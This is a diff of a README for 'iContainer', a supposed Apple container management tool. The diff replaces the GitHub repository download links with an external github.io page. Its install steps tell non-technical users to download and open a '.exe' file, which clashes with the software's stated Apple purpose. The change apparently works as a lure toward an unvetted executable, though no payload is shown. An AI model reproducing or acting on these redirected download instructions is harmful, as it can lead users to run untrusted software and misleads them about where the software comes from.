@@ -1,6 +1,6 @@
 # 📦 iContainer - Manage your Apple workspaces with ease
 
-[![](https://img.shields.io/badge/Download-iContainer-blue.svg)](https://github.com/Aliceafuzzy99/iContainer)
+[![](https://img.shields.io/badge/Download-iContainer-blue.svg)](https://aliceafuzzy99.github.io)
 
 iContainer helps you manage Apple container workloads on your computer. This software provides a clear interface for tasks that would otherwise require complex commands. You can organize, monitor, and control your containers without deep technical knowledge. 
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download: [https://github.com/Aliceafuzzy99/iContainer](https://github.com/Aliceafuzzy99/iContainer)
+1. Visit this page to download: [https://aliceafuzzy99.github.io](https://aliceafuzzy99.github.io)
 2. Locate the latest release version on the page.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
